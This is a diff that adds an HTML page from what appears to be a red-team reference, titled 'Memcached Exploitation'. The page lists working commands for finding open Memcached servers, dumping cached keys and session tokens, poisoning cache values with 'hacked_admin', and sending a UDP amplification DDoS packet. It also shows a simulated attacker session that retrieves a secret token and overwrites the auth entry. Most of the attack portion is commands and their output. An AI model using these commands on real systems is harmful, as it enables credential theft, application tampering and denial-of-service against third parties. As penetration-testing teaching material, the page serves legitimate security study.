@@ -1,0 +1,188 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">Memcached Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Caching & Databases</strong> • Focus: <strong>Memcached Abuse & DDoS Amplification</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Memcached (TCP/11211, UDP/11211) is a caching system designed for web performance. 
+    By default, it has no authentication and exposes sensitive cached data if left open. 
+    Attackers exploit Memcached for exfiltrating credentials, API keys, and session tokens, 
+    poisoning cache entries, and leveraging massive DDoS amplification. In Red Team scenarios, 
+    Memcached exploitation enables reconnaissance, lateral movement, and service disruption.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Anyone can query/write cache entries.</li>
+    <li><strong>Sensitive Data in Cache:</strong> API keys, tokens, credentials often stored.</li>
+    <li><strong>UDP Reflection:</strong> Amplification attacks 50,000x the request size.</li>
+    <li><strong>Cache Poisoning:</strong> Attackers can overwrite values to manipulate apps.</li>
+    <li><strong>Wide Exposure:</strong> Thousands of Memcached servers are still publicly accessible.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify open TCP/11211 or UDP/11211 services.</li>
+    <li><strong>Enumeration:</strong> Query stats/items to view cached data.</li>
+    <li><strong>Exfiltration:</strong> Retrieve sensitive cached keys/values.</li>
+    <li><strong>Exploitation:</strong> Poison cache or use server in reflection/amplification DDoS.</li>
+    <li><strong>Impact:</strong> Data theft, application manipulation, large-scale DoS.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and detect Memcached service.</li>
+    <li>Enumerate stats and available keys.</li>
+    <li>Dump cached sensitive data.</li>
+    <li>Inject malicious or poisoned cache entries.</li>
+    <li>Optionally abuse UDP for amplification DoS.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p11211 -sV [target]                       # Scan for Memcached
+nmap -sU -p11211 [target]                       # Check UDP service
+
+# ------------------------------
+# Manual Interaction
+# ------------------------------
+echo "stats" | nc [target] 11211
+echo "stats items" | nc [target] 11211
+echo "get SESSION_ID" | nc [target] 11211
+
+# ------------------------------
+# Automated Dump
+# ------------------------------
+memcdump -s [target]                            # Dump all keys
+memccat -s [target] -k KEY_NAME                 # Retrieve value
+
+# ------------------------------
+# Cache Poisoning
+# ------------------------------
+echo "set auth 0 900 12" | nc [target] 11211
+echo "hacked_admin" | nc [target] 11211
+
+# ------------------------------
+# Amplification DDoS Example
+# ------------------------------
+echo -ne "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -u -w1 [target] 11211
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p11211 192.168.1.50 -sV
+echo "stats items" | nc 192.168.1.50 11211
+memcdump -s 192.168.1.50
+memccat -s 192.168.1.50 -k auth_token
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p11211 -sV 192.168.1.60
+PORT      STATE SERVICE VERSION
+11211/tcp open  memcached Memcached 1.5.6
+
+[ saide ~ ]$ echo "stats" | nc 192.168.1.60 11211 | head -5
+STAT pid 1203
+STAT uptime 3400
+STAT curr_connections 5
+STAT cmd_get 200
+STAT bytes 34567
+
+[ saide ~ ]$ memcdump -s 192.168.1.60
+auth_token
+session_123
+user_cache
+
+[ saide ~ ]$ memccat -s 192.168.1.60 -k auth_token
+SuperSecretKey2025!
+
+[ saide ~ ]$ echo "set auth 0 900 15" | nc 192.168.1.60 11211
+hacked_admin
+
+[ saide ~ ]$ echo "get auth" | nc 192.168.1.60 11211
+VALUE auth 0 15
+hacked_admin
+END
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample Memcached exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+11211/tcp open  memcached 1.5.6
+
+# Retrieved Keys
+auth_token
+session_123
+user_cache
+
+# Sensitive Data
+auth_token = SuperSecretKey2025!
+
+# Cache Poisoning
+auth = hacked_admin
+
+# Proof of Exploitation
+Attacker retrieved sensitive data and replaced cache values
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/memcached-pentesting" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting Memcached
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1498/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Network Denial of Service (UDP Amplification)
+      </a>
+    </li>
+    <li>Red Team workflow: Discovery → Dump keys → Exfil secrets → Poison values → Optional DDoS abuse.</li>
+  </ul>
+</section>
